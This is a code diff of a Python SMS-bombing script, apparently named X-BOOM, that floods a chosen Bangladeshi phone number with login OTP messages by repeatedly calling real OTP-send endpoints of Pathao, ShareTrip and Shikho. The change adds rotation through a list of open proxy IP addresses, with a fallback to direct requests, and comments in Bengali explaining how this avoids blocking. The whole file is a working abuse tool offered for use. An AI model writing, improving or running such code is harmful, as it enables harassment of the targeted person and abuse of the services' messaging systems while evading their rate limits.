@@ -1,47 +1,45 @@
-import requests, os, time, uuid
+import requests, os, time, random
 
 def start():
     os.system('clear')
-    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
-    print('         ██    ██    ██    ██   ██ ')
-    print('         ██    ██    ██    ██████  ')
-    print('         ██    ██    ██    ██      ')
-    print('          ██████     ██    ██      \033[0m')
+    print('\033[1;32m[ X-BOOM PRO PROXY EDITION ]\033[0m')
+    target = input('\n\033[1;32m[+] TARGET (017...): \033[0m')
+    amount = int(input('\033[1;32m[+] AMOUNT: \033[0m'))
     
-    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
-    print(line)
-    print('\033[1;34m| [✓] DEVELOPED BY :  MMALEK ISLAM          |')
-    print('| [✓] TEAM         :  X-BOOM VIP TEAM       |')
-    print('| [✓] TOOL STATUS  :  PREMIUM ACTIVATED     |')
-    print('| [✓] GITHUB       :  mmalekislam788        |')
-    print('| [✓] VERSION      :  VIP BYPASS 2026       |\033[0m')
-    print(line)
-    
-    # এটি আপনার জন্য একদম ফ্রি প্রিমিয়াম কী
-    print(f'\033[1;32m[❤️] STATUS: PREMIUM USER ACTIVATED [❤️]')
-    print(f'[❤️] VALIDITY: LIFETIME (FREE FOR YOU) [❤️]\033[0m')
-    print(line)
-
-    target = input('\n\033[1;32m[+] TARGET NUMBER (017...): \033[0m')
-    amount = int(input('\033[1;32m[+] SMS AMOUNT: \033[0m'))
-    
-    # পাওয়ারফুল এপিআই লিস্ট
-    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    # ফ্রি প্রক্সি লিস্ট (এখানে আপনি আরও প্রক্সি যোগ করতে পারেন)
+    proxy_list = [
+        "http://103.152.112.162:80",
+        "http://103.102.131.218:80",
+        "http://45.251.228.162:80",
+        "http://103.108.140.246:80"
+    ]
 
     for i in range(1, amount + 1):
+        # প্রতিবার একটি র‍্যান্ডম প্রক্সি সিলেক্ট হবে
+        proxy = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
+        
         try:
             # Pathao API
-            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers, timeout=5)
-            # ShareTrip API
-            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=5)
-            # Shikho API
-            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers, timeout=5)
+            requests.post("https://api-hermes.pathao.com/user/otp-send/login", 
+                          json={"phone": "+88"+target}, 
+                          proxies=proxy, timeout=5)
             
-            print(f'\033[1;32m[{i}] VIP SUCCESS SENT ==> {target}\033[0m')
+            # ShareTrip API
+            requests.post("https://api.sharetrip.net/api/v1/otp/send", 
+                          json={"mobileNumber": target, "type": "login"}, 
+                          proxies=proxy, timeout=5)
+
+            print(f'\033[1;32m[{i}] SENT VIA PROXY: {proxy["http"]} ==> {target}\033[0m')
         except:
-            print(f'\033[1;31m[{i}] VIP FAILED SENT ==> {target}\033[0m')
+            # প্রক্সি কাজ না করলে সরাসরি আইপি দিয়ে ট্রাই করবে
+            print(f'\033[1;33m[{i}] PROXY FAILED, TRYING DIRECTLY...\033[0m')
+            try:
+                requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, timeout=5)
+                print(f'\033[1;32m[{i}] DIRECT SUCCESS ==> {target}\033[0m')
+            except:
+                print(f'\033[1;31m[{i}] FAILED\033[0m')
         
-        time.sleep(2) # দ্রুত পাঠানোর জন্য সময় কমানো হয়েছে
+        time.sleep(5) # ব্লকিং এড়াতে ৫ সেকেন্ড গ্যাপ
 
 if __name__ == "__main__":
     start()
